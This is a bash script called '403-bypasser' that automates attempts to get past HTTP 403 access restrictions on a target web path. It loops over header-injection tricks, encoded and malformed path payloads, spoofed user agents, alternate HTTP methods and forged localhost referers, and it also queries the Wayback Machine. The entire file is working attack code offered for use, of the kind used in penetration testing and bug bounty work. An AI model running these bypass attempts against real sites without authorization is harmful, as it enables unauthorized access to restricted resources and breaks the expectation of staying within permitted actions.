#!/usr/bin/bash
figlet "403-bypasser"
echo "          By 0xmicro          "
echo " "
if [ $# == 0 ]
then
echo "Please enter the arguments"
echo "ex:"
echo "./403-bypasser.sh https://example.com path"
exit
fi
data=$(curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2)
echo "[+] $data ${1}/${2}"
IFS=$'\n'
bypass_403_1(){
    for header in $(cat headers.txt)
    do
        if [ $header == "X-Original-Url:" -o $header == "X-Rewrite-Url:" ]
        then
            data=$(curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "$header $2" $1)
            echo "[+] $data $1 -H $header $2"
        else
            data=$(curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "$header" $1/$2)
            echo "[+] $data ${1}/${2} -H $header"
        fi
    done
}
bypass_403_2(){
    for payloads in $(cat $3)
    do
        data=$(curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2$payloads)
        echo "[+] $data ${1}/${2}$payloads"
    done
}
bypass_403_3(){
    for agent in $(cat $3)
    do
        data=$(curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "User-Agent: $agent" "$1/$2" )
        echo "[+] $data ${1}/${2} -H User-Agent: $agent"
    done
}
bypass_403_4(){
    data=$(curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/%2e/$2")
    echo "[+] $data $1/%2e/$2"
    data=$(curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/%2e/$2_")
    echo "[+] $data $1/%2e/$2_"
    data=$(curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/%ef%bc%8f$2")
    echo "[+] $data $1/%ef%bc%8f$2"
    data=$(curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/")
    echo "[+] $data $1/$2/"
    data=$(curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/.")
    echo "[+] $data $1/$2/."
    data=$(curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1//$2//")
    echo "[+] $data $1//$2//"
    data=$(curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/../$2/..")
    echo "[+] $data $1/../$2/.."
    data=$(curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/./$2/..")
    echo "[+] $data $1/./$2/.."
    data=$(curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/./$2/.")
    echo "[+] $data $1/./$2/."
    data=$(curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/;/$2")
    echo "[+] $data $1/;/$2"
    data=$(curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/.;/$2")
    echo "[+] $data $1/.;/$2"
    data=$(curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1//.;//$2")
    echo "[+] $data $1//.;//$2"
    data=$(curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1//;//$2")
    echo "[+] $data $1//;//$2"
    data=$(curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2)
    echo "[+] $data $1/$2 -X TRACE "
    data=$(curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$2)
    echo "[+] $data $1/$2 -H Content-Length:0 -X POST "
    data=$(curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X PUT $1/$2)
    echo "[+] $data $1/$2 -H Content-Length:0 -X PUT "
    data=$(curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -e "localhost" $1/$2)
    echo "[+] $data $1/$2 -e localhost "
    data=$(curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -e "127.0.0.1" $1/$2)
    echo "[+] $data $1/$2 -e 127.0.0.1 "
    data=$(curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -e "$1" $1/$2)
    echo "[+] $data $1/$2 -e $1 "
    echo "Way back machine:"
    curl -s  https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}'
}

bypass_403_1 $1 $2 headers.txt &
bypass_403_2 $1 $2 extensions.txt &
bypass_403_2 $1 $2 payloads.txt &
bypass_403_3 $1 $2 agents.txt &
bypass_403_4 $1 $2 &

wait
echo "All tasks completed."
